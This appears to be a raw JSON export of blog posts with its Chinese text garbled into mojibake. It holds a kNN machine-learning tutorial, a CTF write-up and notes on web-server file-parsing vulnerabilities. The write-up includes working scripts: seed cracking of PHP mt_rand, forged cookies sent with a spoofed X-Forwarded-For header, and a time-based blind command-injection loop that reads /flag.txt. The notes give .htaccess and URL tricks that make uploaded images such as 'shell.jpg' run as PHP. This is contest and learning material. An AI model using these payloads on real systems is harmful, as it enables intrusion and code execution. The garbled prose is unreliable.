æ•°æ®å¤„ç† å½’ä¸€åŒ–æ•°æ® ï¼ˆå½’ä¸€åŒ–æ˜¯ä¸€ä¸ªè®©æƒé‡å˜ä¸ºç»Ÿä¸€çš„è¿‡ç¨‹ï¼Œæ›´å¤šç»†èŠ‚è¯·å‚è€ƒ: https://www.zhihu.com/question/19951858 ï¼‰ åºå· ç©è§†é¢‘æ¸¸æˆæ‰€è€—æ—¶é—´ç™¾åˆ†æ¯” æ¯å¹´è·å¾—çš„é£è¡Œå¸¸å®¢é‡Œç¨‹æ•° æ¯å‘¨æ¶ˆè´¹çš„å†°æ·‡æ·‹å…¬å‡æ•° æ ·æœ¬åˆ†ç±» 1 0.8 400 0.5 1 2 12 134 000 0.9 3 3 0 20 000 1.1 2 4 67 32 000 0.1 2 æ ·æœ¬3å’Œæ ·æœ¬4çš„è·ç¦»: $$\\sqrt{(0-67)^2 + (20000-32000)^2 + (1.1-0.1)^2 }$$ å½’ä¸€åŒ–ç‰¹å¾å€¼ï¼Œæ¶ˆé™¤ç‰¹å¾ä¹‹é—´é‡çº§ä¸åŒå¯¼è‡´çš„å½±å“ã€‚ ç¼–å†™åä¸ºautoNormçš„å‡½æ•°ï¼Œç”¨è¯¥å‡½æ•°è‡ªåŠ¨å°†æ•°æ®å½’ä¸€åŒ–ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758# -*- coding: UTF-8 -*-import numpy as npfrom matplotlib.font_manager import FontPropertiesimport matplotlib.lines as mlinesimport matplotlib.pyplot as pltdef file2matrix(filename): with open(filename) as fr: # è¯»å–æ•°æ®é›† array0Lines = fr.readlines() # æ•°æ®é›†çš„è¡Œæ•°ï¼Œå³æœ‰å¤šå°‘æ¡æ•°æ® numberOfLines = len(array0Lines) # ç”ŸæˆnumberOfLinesè¡Œï¼Œ3åˆ—çš„é›¶çŸ©é˜µä½œä¸ºç‰¹å¾çŸ©é˜µçš„åˆå§‹å€¼ returnMat = np.zeros((numberOfLines, 3)) # åˆ†ç±»æ ‡ç­¾å‘é‡ classLableVector = [] index = 0 for line in array0Lines: # åˆ†å‰²æ•°æ®ï¼Œæ¯ä¸ªlistä¸€å…±æœ‰å››ä¸ªæ•°æ®ï¼Œå³ä¸‰ä¸ªç‰¹å¾å€¼å’Œä¸€ä¸ªæ ‡ç­¾ listFromLine = line.strip().split(&#x27;\\t&#x27;) # å°†å‰ä¸‰ä¸ªæ•°æ®æå–å‡ºæ¥ï¼Œå­˜æ”¾è‡³ç‰¹å¾çŸ©é˜µ returnMat[index, :] = listFromLine[0:3] # å°†æœ€åä¸€ä¸ªæ•°æ®æå–å‡ºæ¥ï¼Œå­˜æ”¾è‡³æ ‡ç­¾å‘é‡ï¼Œå¹¶è½¬æ¢ä¸ºæ•´å‹è¡¨ç¤º label = listFromLine[-1] if label == &#x27;didntLike&#x27;: classLableVector.append(1) elif label == &#x27;smallDoses&#x27;: classLableVector.append(2) elif label == &#x27;largeDoses&#x27;: classLableVector.append(3) index += 1 return returnMat, classLableVectordef autoNorm(dataSet): # è·å–æ•°æ®çš„æœ€å€¼ minVals = dataSet.min(0) maxVals = dataSet.max(0) ranges = maxVals - minVals # ä¸dataSetç›¸åŒå¤§å°çš„é›¶çŸ©é˜µ normDataSet = np.zeros(np.shape(dataSet)) # è¿”å›dataSetçš„è¡Œæ•° m = dataSet.shape[0] # åŸå§‹å€¼å‡å»æœ€å°å€¼ normDataSet = dataSet - np.tile(minVals, (m, 1)) # é™¤ä»¥æœ€å¤§å’Œæœ€å°å€¼çš„å·®ï¼Œå¾—åˆ°å½’ä¸€åŒ–æ•°æ® normDataSet = normDataSet / np.tile(ranges, (m, 1)) return normDataSet, ranges, minValsif __name__ == &#x27;__main__&#x27;: filename = &#x27;datingTestSet.txt&#x27; datingDataMat, datingLabels = file2matrix(filename) normDataSet, ranges, minVals = autoNorm(datingDataMat) print(normDataSet) print(ranges) print(minVals) è¿”å›ç»“æœï¼š éªŒè¯åˆ†ç±»å™¨ ä¸ºäº†æµ‹è¯•åˆ†ç±»å™¨æ•ˆæœï¼Œåˆ›å»ºå‡½æ•°datingClassTestï¼Œä½¿ç”¨å·²æœ‰æ•°æ®çš„90%ä½œä¸ºè®­ç»ƒæ ·æœ¬æ¥è®­ç»ƒåˆ†ç±»å™¨ï¼Œè€Œä½¿ç”¨å…¶ä½™çš„10%æ•°æ®å»æµ‹è¯•åˆ†ç±»å™¨ï¼Œæ£€æµ‹åˆ†ç±»å™¨çš„æ­£ç¡®ç‡ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899# -*- coding: UTF-8 -*-import operatorimport numpy as npdef classify0(inX, dataSet, labels, k): # è·å–dataSizeçš„è¡Œæ•° dataSize = dataSet.shape[0] # è®¡ç®—inXä¸dataSetæ¯ä¸ªç‚¹çš„æ¨ªçºµåæ ‡çš„å·®å€¼ diffMat = np.tile(inX, (dataSize, 1)) - dataSet # å¹³æ–¹ sqDiffMat = diffMat**2 # sum()æ‰€æœ‰å…ƒç´ ç›¸åŠ ï¼Œsum(0)åˆ—ç›¸åŠ ï¼Œsum(1)è¡Œç›¸åŠ  sqDistances = sqDiffMat.sum(axis=1) # å¼€æ–¹ distances = sqDistances**0.5 # è¿”å›distancesä¸­å…ƒç´ ä»å°åˆ°å¤§æ’åºåçš„ç´¢å¼•å€¼ sortedDistIndices = distances.argsort() # è®°å½•ç±»åˆ«æ¬¡æ•°çš„å­—å…¸ classCount = &#123;&#125; for i in range(k): # å–å‡ºæ’åºåçš„ç¬¬iä¸ªçš„ç‰¹å¾ voteIlabel = labels[sortedDistIndices[i]] # è®¡ç®—ç±»åˆ«æ¬¡æ•° classCount[voteIlabel] = classCount.get(voteIlabel, 0) + 1 # æ ¹æ®å­—å…¸çš„å€¼ï¼Œå³ç±»åˆ«æ¬¡æ•°è¿›è¡Œé™åºæ’åº sortedClassCount = sorted(classCount.items(), key=operator.itemgetter(1), reverse=True) return sortedClassCount[0][0]def file2matrix(filename): with open(filename) as fr: # è¯»å–æ•°æ®é›† array0Lines = fr.readlines() # æ•°æ®é›†çš„è¡Œæ•°ï¼Œå³æœ‰å¤šå°‘æ¡æ•°æ® numberOfLines = len(array0Lines) # ç”ŸæˆnumberOfLinesè¡Œï¼Œ3åˆ—çš„é›¶çŸ©é˜µä½œä¸ºç‰¹å¾çŸ©é˜µçš„åˆå§‹å€¼ returnMat = np.zeros((numberOfLines, 3)) # åˆ†ç±»æ ‡ç­¾å‘é‡ classLableVector = [] index = 0 for line in array0Lines: # åˆ†å‰²æ•°æ®ï¼Œæ¯ä¸ªlistä¸€å…±æœ‰å››ä¸ªæ•°æ®ï¼Œå³ä¸‰ä¸ªç‰¹å¾å€¼å’Œä¸€ä¸ªæ ‡ç­¾ listFromLine = line.strip().split(&#x27;\\t&#x27;) # å°†å‰ä¸‰ä¸ªæ•°æ®æå–å‡ºæ¥ï¼Œå­˜æ”¾è‡³ç‰¹å¾çŸ©é˜µ returnMat[index, :] = listFromLine[0:3] # å°†æœ€åä¸€ä¸ªæ•°æ®æå–å‡ºæ¥ï¼Œå­˜æ”¾è‡³æ ‡ç­¾å‘é‡ï¼Œå¹¶è½¬æ¢ä¸ºæ•´å‹è¡¨ç¤º label = listFromLine[-1] if label == &#x27;didntLike&#x27;: classLableVector.append(1) elif label == &#x27;smallDoses&#x27;: classLableVector.append(2) elif label == &#x27;largeDoses&#x27;: classLableVector.append(3) index += 1 return returnMat, classLableVectordef autoNorm(dataSet): # è·å–æ•°æ®çš„æœ€å€¼ minVals = dataSet.min(0) maxVals = dataSet.max(0) ranges = maxVals - minVals # ä¸dataSetç›¸åŒå¤§å°çš„é›¶çŸ©é˜µ normDataSet = np.zeros(np.shape(dataSet)) # è¿”å›dataSetçš„è¡Œæ•° m = dataSet.shape[0] # åŸå§‹å€¼å‡å»æœ€å°å€¼ normDataSet = dataSet - np.tile(minVals, (m, 1)) # é™¤ä»¥æœ€å¤§å’Œæœ€å°å€¼çš„å·®ï¼Œå¾—åˆ°å½’ä¸€åŒ–æ•°æ® normDataSet = normDataSet / np.tile(ranges, (m, 1)) return normDataSet, ranges, minValsdef datingClassTest(): filename = &#x27;datingTestSet.txt&#x27; datingDataMat, datingLabels = file2matrix(filename) normMat, ranges, minVals = autoNorm(datingDataMat) # è·å–æ•°æ®çš„10% hoRatio = 0.1 # è·å–normMatçš„è¡Œæ•° m = normMat.shape[0] # æµ‹è¯•æ•°æ®çš„ä¸ªæ•° numTestVecs = int(m * hoRatio) # åˆ†ç±»é”™è¯¯çš„æŠ€æœ¯ errorCount = 0.0 for i in range(numTestVecs): # å‰numTestVecsä¸ªæ•°æ®ä½œä¸ºæµ‹è¯•é›†,åm-numTestVecsä¸ªæ•°æ®ä½œä¸ºè®­ç»ƒé›† classifierResult = classify0(normMat[i, :], normMat[numTestVecs:m, :], datingLabels[numTestVecs:m], 4) print(&quot;åˆ†ç±»ç»“æœ:%d\\tçœŸå®ç±»åˆ«:%d&quot; % (classifierResult, datingLabels[i])) if classifierResult != datingLabels[i]: errorCount += 1.0 print(&quot;é”™è¯¯ç‡:%f%%&quot; % (errorCount / float(numTestVecs) * 100))if __name__ == &#x27;__main__&#x27;: datingClassTest() åˆ†ç±»ç»“æœ æ„å»ºå®Œæ•´ç³»ç»Ÿ æ„å»ºä¸€ä¸ªå®Œæ•´çš„ç³»ç»Ÿï¼Œé€šè¿‡è¯¥ç¨‹åºæµ·ä¼¦ä¼šåœ¨çº¦ä¼šç½‘ç«™ä¸Šæ‰¾åˆ°æŸä¸ªäººå¹¶è¾“å…¥ä»–çš„ä¿¡æ¯ã€‚ç¨‹åºä¼šç»™å‡ºå¥¹å¯¹ç”·æ–¹å–œæ¬¢ç¨‹åº¦çš„é¢„æµ‹å€¼ã€‚ åœ¨æ–‡ä»¶ä¸­åˆ›å»ºå‡½æ•°classifyPersonï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101# -*- coding: UTF-8 -*-import operatorimport numpy as npfrom matplotlib.font_manager import FontPropertiesimport matplotlib.lines as mlinesimport matplotlib.pyplot as pltdef classify0(inX, dataSet, labels, k): # è·å–dataSizeçš„è¡Œæ•° dataSize = dataSet.shape[0] # è®¡ç®—inXä¸dataSetæ¯ä¸ªç‚¹çš„æ¨ªçºµåæ ‡çš„å·®å€¼ diffMat = np.tile(inX, (dataSize, 1)) - dataSet # å¹³æ–¹ sqDiffMat = diffMat**2 # sum()æ‰€æœ‰å…ƒç´ ç›¸åŠ ï¼Œsum(0)åˆ—ç›¸åŠ ï¼Œsum(1)è¡Œç›¸åŠ  sqDistances = sqDiffMat.sum(axis=1) # å¼€æ–¹ distances = sqDistances**0.5 # è¿”å›distancesä¸­å…ƒç´ ä»å°åˆ°å¤§æ’åºåçš„ç´¢å¼•å€¼ sortedDistIndices = distances.argsort() # è®°å½•ç±»åˆ«æ¬¡æ•°çš„å­—å…¸ classCount = &#123;&#125; for i in range(k): # å–å‡ºæ’åºåçš„ç¬¬iä¸ªçš„ç‰¹å¾ voteIlabel = labels[sortedDistIndices[i]] # è®¡ç®—ç±»åˆ«æ¬¡æ•° classCount[voteIlabel] = classCount.get(voteIlabel, 0) + 1 # æ ¹æ®å­—å…¸çš„å€¼ï¼Œå³ç±»åˆ«æ¬¡æ•°è¿›è¡Œé™åºæ’åº sortedClassCount = sorted(classCount.items(), key=operator.itemgetter(1), reverse=True) return sortedClassCount[0][0]def file2matrix(filename): with open(filename) as fr: # è¯»å–æ•°æ®é›† array0Lines = fr.readlines() # æ•°æ®é›†çš„è¡Œæ•°ï¼Œå³æœ‰å¤šå°‘æ¡æ•°æ® numberOfLines = len(array0Lines) # ç”ŸæˆnumberOfLinesè¡Œï¼Œ3åˆ—çš„é›¶çŸ©é˜µä½œä¸ºç‰¹å¾çŸ©é˜µçš„åˆå§‹å€¼ returnMat = np.zeros((numberOfLines, 3)) # åˆ†ç±»æ ‡ç­¾å‘é‡ classLableVector = [] index = 0 for line in array0Lines: # åˆ†å‰²æ•°æ®ï¼Œæ¯ä¸ªlistä¸€å…±æœ‰å››ä¸ªæ•°æ®ï¼Œå³ä¸‰ä¸ªç‰¹å¾å€¼å’Œä¸€ä¸ªæ ‡ç­¾ listFromLine = line.strip().split(&#x27;\\t&#x27;) # å°†å‰ä¸‰ä¸ªæ•°æ®æå–å‡ºæ¥ï¼Œå­˜æ”¾è‡³ç‰¹å¾çŸ©é˜µ returnMat[index, :] = listFromLine[0:3] # å°†æœ€åä¸€ä¸ªæ•°æ®æå–å‡ºæ¥ï¼Œå­˜æ”¾è‡³æ ‡ç­¾å‘é‡ï¼Œå¹¶è½¬æ¢ä¸ºæ•´å‹è¡¨ç¤º label = listFromLine[-1] if label == &#x27;didntLike&#x27;: classLableVector.append(1) elif label == &#x27;smallDoses&#x27;: classLableVector.append(2) elif label == &#x27;largeDoses&#x27;: classLableVector.append(3) index += 1 return returnMat, classLableVectordef autoNorm(dataSet): # è·å–æ•°æ®çš„æœ€å€¼ minVals = dataSet.min(0) maxVals = dataSet.max(0) ranges = maxVals - minVals # ä¸dataSetç›¸åŒå¤§å°çš„é›¶çŸ©é˜µ normDataSet = np.zeros(np.shape(dataSet)) # è¿”å›dataSetçš„è¡Œæ•° m = dataSet.shape[0] # åŸå§‹å€¼å‡å»æœ€å°å€¼ normDataSet = dataSet - np.tile(minVals, (m, 1)) # é™¤ä»¥æœ€å¤§å’Œæœ€å°å€¼çš„å·®ï¼Œå¾—åˆ°å½’ä¸€åŒ–æ•°æ® normDataSet = normDataSet / np.tile(ranges, (m, 1)) return normDataSet, ranges, minValsdef classifyPerson(): # è¾“å‡ºç»“æœ resultList = [&#x27;è®¨åŒ&#x27;, &#x27;æœ‰äº›å–œæ¬¢&#x27;, &#x27;éå¸¸å–œæ¬¢&#x27;] # ä¸‰ç»´ç‰¹å¾ç”¨æˆ·è¾“å…¥ precentTats = float(input(&quot;ç©è§†é¢‘æ¸¸æˆæ‰€è€—æ—¶é—´ç™¾åˆ†æ¯”:&quot;)) ffMiles = float(input(&quot;æ¯å¹´è·å¾—çš„é£è¡Œå¸¸å®¢é‡Œç¨‹æ•°:&quot;)) iceCream = float(input(&quot;æ¯å‘¨æ¶ˆè´¹çš„å†°æ¿€æ·‹å…¬å‡æ•°:&quot;)) filename = &#x27;datingTestSet.txt&#x27; datingDataMat, datingLabels = file2matrix(filename) normMat, ranges, minVals = autoNorm(datingDataMat) # ç”ŸæˆNumPyæ•°ç»„,æµ‹è¯•é›† inArr = np.array([ffMiles, precentTats, iceCream]) # æµ‹è¯•é›†å½’ä¸€åŒ– norminArr = (inArr - minVals) / ranges # è¿”å›åˆ†ç±»ç»“æœ classifierResult = classify0(norminArr, normMat, datingLabels, 3) # æ‰“å°ç»“æœ print(&quot;ä½ å¯èƒ½%sè¿™ä¸ªäºº&quot; % (resultList[classifierResult - 1]))if __name__ == &#x27;__main__&#x27;: classifyPerson() è¾“å…¥ç¤ºä¾‹ï¼š 0x04 kNNå®æˆ˜ä¹‹sklearnæ‰‹å†™æ•°å­—è¯†åˆ« 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768# -*- coding: UTF-8 -*-import numpy as npimport operatorfrom os import listdirfrom sklearn.neighbors import KNeighborsClassifier as kNNdef img2vector(filename): # åˆ›å»ºä¸€ä¸ª1*1024çš„é›¶å‘é‡ returnVect = np.zeros((1, 1024)) # æ‰“å¼€æ–‡ä»¶ with open(filename, &#x27;r&#x27;) as f: for i in range(32): # è¯»å–ä¸€è¡Œæ•°æ® lineStr = f.readline() # æ¯ä¸€è¡Œå‰32ä¸ªå…ƒç´ ä¾æ¬¡æ·»åŠ åˆ°returnVectä¸­ for j in range(32): returnVect[0, i*32+j] = int(lineStr[j]) # è¿”å›è½¬æ¢åçš„1*1024å‘é‡ return returnVectdef handwritingClassTest(): # æµ‹è¯•é›†lables hwlables = [] # è¿”å›trainingDigitsä¸‹çš„æ–‡ä»¶å trainingFileList = listdir(&#x27;trainingDigits&#x27;) # è¿”å›æ–‡ä»¶ä¸ªæ•° m = len(trainingFileList) # åˆå§‹åŒ–è®­ç»ƒçŸ©é˜µ trainingMat = np.zeros((m, 1024)) # ä»æ–‡ä»¶åä¸­è§£æå‡ºè®­ç»ƒé›†çš„ç±»åˆ« for i in range(m): # è·å¾—æ–‡ä»¶å fileName = trainingFileList[i] # è·å¾—åˆ†ç±»çš„æ•°å­— classNumber = int(fileName.split(&#x27;_&#x27;)[0]) # å°†ç±»åˆ«æ·»åŠ åˆ°hwlables hwlables.append(classNumber) trainingMat[i, :] = img2vector(&#x27;trainingDigits/&#123;&#125;&#x27;.format(fileName)) # æ„å»ºkNNåˆ†ç±»å™¨ neigh = kNN(n_neighbors=3, algorithm=&#x27;auto&#x27;) # æ‹Ÿåˆæ¨¡å‹ neigh.fit(trainingMat, hwlables) # è¿”å›testDigitsç›®å½•ä¸‹æ–‡ä»¶ testFileList = listdir(&#x27;testDigits&#x27;) # é”™è¯¯æ£€æµ‹è®¡æ•° errorCount = 0.0 # æµ‹è¯•æ•°æ®çš„æ•°é‡ mTest = len(testFileList) # ä»æ–‡ä»¶ä¸­è§£æå‡ºæµ‹è¯•é›†çš„ç±»åˆ«å¹¶åˆ†ç±» for i in range(mTest): # è·å¾—æ–‡ä»¶å fileName = testFileList[i] # è·å¾—åˆ†ç±»çš„æ•°å­— classNumber = int(fileName.split(&#x27;_&#x27;)[0]) # è·å¾—æµ‹è¯•é›†çš„1*1024å‘é‡ï¼Œç”¨äºè®­ç»ƒ testVect = img2vector(&#x27;testDigits/&#123;&#125;&#x27;.format(fileName)) # è·å¾—é¢„æµ‹ç»“æœ classifierResult = neigh.predict(testVect) print(&quot;åˆ†ç±»è¿”å›ç»“æœä¸º%d\\tçœŸå®ç»“æœä¸º%d&quot; % (classifierResult, classNumber)) if classifierResult != classNumber: errorCount += 1.0 print(&quot;æ€»å…±é”™äº†%dä¸ªæ•°æ®\\né”™è¯¯ç‡ä¸º%f%%&quot; % (errorCount, errorCount / mTest * 100))if __name__ == &#x27;__main__&#x27;: handwritingClassTest() 0x05 kNNå°ç»“ åŸºæœ¬åŸç† é€šè¿‡è·ç¦»åº¦é‡æ¥è®¡ç®—æŸ¥è¯¢ç‚¹ï¼ˆquery pointï¼‰ä¸æ¯ä¸ªè®­ç»ƒæ•°æ®ç‚¹çš„è·ç¦»ï¼Œç„¶åé€‰å‡ºä¸æŸ¥è¯¢ç‚¹ï¼ˆquery pointï¼‰ç›¸è¿‘çš„Kä¸ªæœ€é‚»ç‚¹ï¼ˆK nearest neighborsï¼‰ï¼Œä½¿ç”¨åˆ†ç±»å†³ç­–æ¥é€‰å‡ºå¯¹åº”çš„æ ‡ç­¾æ¥ä½œä¸ºè¯¥æŸ¥è¯¢ç‚¹çš„æ ‡ç­¾ã€‚ kNNä¸‰è¦ç´  kçš„å–å€¼ å¯¹æŸ¥è¯¢ç‚¹æ ‡ç­¾å½±å“æ˜¾è‘—ï¼ˆæ•ˆæœæ‹”ç¾¤ï¼‰ã€‚kå€¼å°çš„æ—¶å€™ï¼Œè¿‘ä¼¼è¯¯å·®å°ï¼Œä¼°è®¡è¯¯å·®å¤§ã€‚kå€¼å¤§ï¼Œè¿‘ä¼¼è¯¯å·®å¤§ï¼Œä¼°è®¡è¯¯å·®å°ã€‚ è·ç¦»åº¦é‡ è·ç¦»åº¦é‡é€šå¸¸ä¸ºæ¬§å¼è·ç¦»ï¼ˆEuclidean distanceï¼‰ï¼Œè¿˜å¯ä»¥æ˜¯ Minkowski è·ç¦»æˆ–è€…æ›¼å“ˆé¡¿è·ç¦»ã€‚ä¹Ÿå¯ä»¥æ˜¯åœ°ç†ç©ºé—´ä¸­çš„ä¸€äº›è·ç¦»å…¬å¼ã€‚ åˆ†ç±»å†³ç­– åˆ†ç±»å†³ç­–åœ¨åˆ†ç±»é—®é¢˜ä¸­é€šå¸¸ä¸ºé€šè¿‡å°‘æ•°æœä»å¤šæ•°æ¥é€‰å–ç¥¨æ•°æœ€å¤šçš„æ ‡ç­¾ï¼Œåœ¨å›å½’é—®é¢˜ä¸­é€šå¸¸ä¸º Kä¸ªæœ€é‚»ç‚¹çš„æ ‡ç­¾çš„å¹³å‡å€¼ã€‚","tags":[],"categories":[]},{"title":"é¦–å±Šé’“é±¼åŸæ¯CTFæ¯”èµ›","date":"2020-08-28T12:28:36.000Z","path":"Web_security/ctf_writeup/22.é¦–å±Šé’“é±¼åŸæ¯CTF/","text":"â€œé’“é±¼åŸæ¯â€å›½é™…ç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›Writeup easyseed index.bakï¼š 12345678910$lock = random(6, &#x27;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;);$key = random(16, &#x27;1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;);function random($length, $chars = &#x27;0123456789ABC&#x27;) &#123; $hash = &#x27;&#x27;; $max = strlen($chars) - 1; for($i = 0; $i &lt; $length; $i++) &#123; $hash .= $chars[mt_rand(0, $max)]; &#125; return $hash;&#125; ä½¿ç”¨php_mt_randéšæœºæ•°ç§å­çˆ†ç ´ã€‚ ç”¨è„šæœ¬ç”Ÿæˆphp_mt_randå·¥å…·çš„å‚æ•°ï¼š 1234567891011str1 = &#x27;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;str2 = &#x27;vEUHaY&#x27;str3 = str1[::-1]length = len(str2)res = &#x27;&#x27;for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res += str(j) + &#x27; &#x27; + str(j) + &#x27; &#x27; + &#x27;0&#x27; + &#x27; &#x27; + str(len(str1) - 1) + &#x27; &#x27; breakprint(res) çˆ†ç ´seed å†ç”Ÿæˆkeyå€¼ 12345678910111213mt_srand(&#x27;718225&#x27;);$lock = random(6, &#x27;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;);$key = random(16, &#x27;1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;);echo $lock.PHP_EOL;echo $key;function random($length, $chars = &#x27;0123456789ABC&#x27;) &#123; $hash = &#x27;&#x27;; $max = strlen($chars) - 1; for($i = 0; $i &lt; $length; $i++) &#123; $hash .= $chars[mt_rand(0, $max)]; &#125; return $hash;&#125; å‘é€payloadï¼š 1234567891011import requestsurl = &#x27;&#x27;&#x27;http://122.112.252.28:20001/&#x27;&#x27;&#x27;cookies = &#123; &#x27;key&#x27;: &#x27;nRtqGR8mtd9ZOPyI&#x27;, &#x27;lock&#x27;: &#x27;vEUHaY&#x27;&#125;headers = &#123; &#x27;X-Forwarded-For&#x27;: &#x27;127.0.0.1&#x27;&#125;res = requests.get(url=url, cookies=cookies, headers=headers)print(res.text) easyweb æŠ“åŒ… ç„¶åæ— å›æ˜¾å‘½ä»¤æ‰§è¡Œï¼Œç„¶åç›²æ³¨ä¸€ä¸‹ 123456789101112131415161718import requestsfrom time import timeurl = &#x27;http://119.3.37.185/&#x27;payload = &#x27;if [ `cut -c &#123;num1&#125; /flag.txt` = &quot;&#123;num2&#125;&quot; ];then sleep 2;fi&#x27;flag = &#x27;&#x27;for i in range(400): for j in range(32,127): data = &#123; &#x27;cmd&#x27;:payload.format(num1=str(i),num2=chr(j)) &#125; start_time = time() requests.post(url,data=data) if time()-start_time&gt;2: flag += chr(j) print(flag) if chr(j) == &#x27;&#125;&#x27;: exit()","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"}]},{"title":"æœåŠ¡å™¨æ–‡ä»¶è§£ææ¼æ´è®°å½•","date":"2020-08-19T05:26:06.000Z","path":"Web_security/basic_learning/25.æœåŠ¡å™¨æ–‡ä»¶è§£ææ¼æ´è®°å½•/","text":"æœåŠ¡å™¨æ–‡ä»¶è§£ææ¼æ´è®°å½• æ²¡æœ‰æ–°ä¸œè¥¿ï¼Œç®€å•è®°å½•ä¸€ä¸‹ã€‚ https://www.anquanke.com/post/id/166616 0x01 IISæ–‡ä»¶è§£ææ¼æ´ ä½¿ç”¨iis5.x-6.xç‰ˆæœ¬çš„æœåŠ¡å™¨ï¼Œå¤§å¤šä¸ºwindows server 2003ï¼Œç½‘ç«™æ¯”è¾ƒå¤è€ï¼Œå¼€å‘è¯­å¥ä¸€èˆ¬ä¸ºaspï¼›è¯¥è§£ææ¼æ´ä¹Ÿåªèƒ½è§£æaspæ–‡ä»¶ï¼Œè€Œä¸èƒ½è§£æaspxæ–‡ä»¶ã€‚ ç›®å½•è§£æ å½¢å¼ï¼šwww.xxx.com/xx.asp/xx.jpg åŸç†: æœåŠ¡å™¨é»˜è®¤ä¼šæŠŠ.aspï¼Œ.asaç›®å½•ä¸‹çš„æ–‡ä»¶éƒ½è§£ææˆaspæ–‡ä»¶ã€‚ æ–‡ä»¶è§£æ å½¢å¼ï¼šwww.xxx.com/xx.asp;.jpg åŸç†ï¼šæœåŠ¡å™¨é»˜è®¤ä¸è§£æ;å·åé¢çš„å†…å®¹ï¼Œå› æ­¤xx.asp;.jpgä¾¿è¢«è§£ææˆaspæ–‡ä»¶äº†ã€‚ è¡¥å…… IIS6.0çš„è§£ææ¼æ´åŒæ ·å­˜åœ¨äºIIS7.5ç‰ˆæœ¬ã€‚ 0x02 Apacheæ–‡ä»¶è§£ææ¼æ´ å¤šåç¼€ Apache1.xå’Œ2.x è§£ææ–‡ä»¶çš„è§„åˆ™æ˜¯ä»å³åˆ°å·¦å¼€å§‹åˆ¤æ–­è§£æ,å¦‚æœåç¼€åä¸ºä¸å¯è¯†åˆ«æ–‡ä»¶è§£æ,å°±å†å¾€å·¦åˆ¤æ–­ã€‚ confé…ç½® 1ã€å¦‚æœåœ¨ Apache çš„ conf é‡Œæœ‰è¿™æ ·ä¸€è¡Œé…ç½® AddHandler php5-script .php è¿™æ—¶åªè¦æ–‡ä»¶åé‡ŒåŒ…å« .php å³ä½¿æ–‡ä»¶åæ˜¯ test2.php.jpg ä¹Ÿä¼šä»¥ php æ¥æ‰§è¡Œã€‚ 2ã€å¦‚æœåœ¨ Apache çš„ conf é‡Œæœ‰è¿™æ ·ä¸€è¡Œé…ç½® AddType application/x-httpd-php .jpgå³ä½¿æ‰©å±•åæ˜¯ jpgï¼Œä¸€æ ·èƒ½ä»¥ php æ–¹å¼æ‰§è¡Œã€‚ ç½•è§åç¼€ Apache é…ç½®æ–‡ä»¶ä¸­ä¼šæœ‰.+.ph(p[345]?|t|tml)æ­¤ç±»çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œè¢«å½“ php ç¨‹åºæ‰§è¡Œçš„æ–‡ä»¶åè¦ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼ï¼Œå¦åˆ™å°±ç®— Apache æŠŠæŸæ–‡ä»¶å½“ php ç¨‹åºï¼Œphp è‡ªå·±ä¸è®¤å®ƒï¼Œä¹Ÿæ˜¯æ— ç”¨ã€‚ ä¹Ÿå°±æ˜¯è¯´php3ï¼Œphp4ï¼Œphp5ï¼Œphtï¼Œphtmlä¹Ÿæ˜¯å¯ä»¥è¢«è§£æçš„ã€‚ .htaccess è¦æƒ³ä½¿ .htaccess æ–‡ä»¶ç”Ÿæ•ˆï¼Œéœ€è¦ä¸¤ä¸ªæ¡ä»¶: ä¸€æ˜¯åœ¨ Apache çš„é…ç½®æ–‡ä»¶ä¸­å†™ä¸Šï¼š 1AllowOverrideAll è‹¥è¿™æ ·å†™åˆ™ .htaccess ä¸ä¼šç”Ÿæ•ˆï¼š 1AllowOverrideNone äºŒæ˜¯ Apache è¦åŠ è½½ mod_Rewrite æ¨¡å—ã€‚åŠ è½½è¯¥æ¨¡å—ï¼Œéœ€è¦åœ¨ Apache çš„é…ç½®æ–‡ä»¶ä¸­å†™ä¸Šï¼š 1LoadModulerewrite_module&#x2F;usr&#x2F;lib&#x2F;apache2&#x2F;modules&#x2F;mod_rewrite.so è‹¥æ˜¯åœ¨ Ubuntu ä¸­ï¼Œå¯èƒ½è¿˜éœ€è¦æ‰§è¡Œå‘½ä»¤ï¼š 1sudoa2enmod rewrite é…ç½®å®Œåéœ€è¦é‡å¯ Apacheã€‚ å¦‚åœ¨ .htaccess æ–‡ä»¶ä¸­å†™å…¥ï¼š 1AddTypeapplication&#x2F;x-httpd-php xxx å°±æˆåŠŸåœ°ä½¿è¯¥ .htaccess æ–‡ä»¶æ‰€åœ¨ç›®å½•åŠå…¶å­ç›®å½•ä¸­çš„åç¼€ä¸º .xxx çš„æ–‡ä»¶è¢« Apache å½“åš php æ–‡ä»¶ã€‚ è¿˜æœ‰ä¸€ç§å†™æ³•ï¼š 123&lt;FilesMatch&quot;shell.jpg&quot;&gt; SetHandlerapplication&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt; 0x03 Nginxæ–‡ä»¶è§£ææ¼æ´ PHP CGIè§£ææ¼æ´ æ¼æ´åŸç†å‚è€ƒï¼šhttps://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html æ‰€ä»¥ä¸‹é¢ä¸¤ç§å†™æ³•éƒ½ä¼šå°†1.jpgå½“ä½œPHPæ¥è§£æ 123www.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg&#x2F;1.php 